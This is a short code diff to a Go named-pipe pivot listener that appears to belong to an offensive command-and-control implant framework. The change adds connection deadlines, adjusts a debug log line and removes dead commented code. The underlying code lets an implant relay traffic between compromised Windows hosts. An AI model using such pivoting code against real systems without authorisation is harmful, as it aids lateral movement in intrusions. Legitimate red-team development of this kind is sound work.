@@ -20,6 +20,7 @@ package pivots
 
 import (
 	"sync"
+	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -29,14 +30,20 @@ import (
 	"github.com/lesnuages/go-winio"
 )
 
+var (
+	namedpipePivotReadDeadline  = 10 * time.Second
+	namedpipePivotWriteDeadline = 10 * time.Second
+)
+
 // CreateNamedPipePivotListener - Starts a named pipe listener
 func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) (*PivotListener, error) {
 	fullName := "\\\\.\\pipe\\" + address
 	ln, err := winio.ListenPipe(fullName, &winio.PipeConfig{
+		//SecurityDescriptor: "",
 		RemoteClientMode: true,
 	})
 	// {{if .Config.Debug}}
-	log.Printf("Listening on %s", fullName)
+	log.Printf("Listening on named pipe %s", fullName)
 	// {{end}}
 	if err != nil {
 		return nil, err
@@ -54,14 +61,6 @@ func CreateNamedPipePivotListener(address string, upstream chan<- *pb.Envelope) 
 }
 
 func namedPipeAcceptConnections(pivotListener *PivotListener) {
-	// hostname, err := os.Hostname()
-	// if err != nil {
-	// 	// {{if .Config.Debug}}
-	// 	log.Printf("Failed to determine hostname %s", err)
-	// 	// {{end}}
-	// 	hostname = "."
-	// }
-	// namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
 	for {
 		conn, err := pivotListener.Listener.Accept()
 		if err != nil {
@@ -72,8 +71,8 @@ func namedPipeAcceptConnections(pivotListener *PivotListener) {
 			conn:          conn,
 			readMutex:     &sync.Mutex{},
 			writeMutex:    &sync.Mutex{},
-			readDeadline:  tcpPivotReadDeadline,
-			writeDeadline: tcpPivotWriteDeadline,
+			readDeadline:  namedpipePivotReadDeadline,
+			writeDeadline: namedpipePivotWriteDeadline,
 			upstream:      pivotListener.Upstream,
 			Downstream:    make(chan *pb.Envelope),
 		}
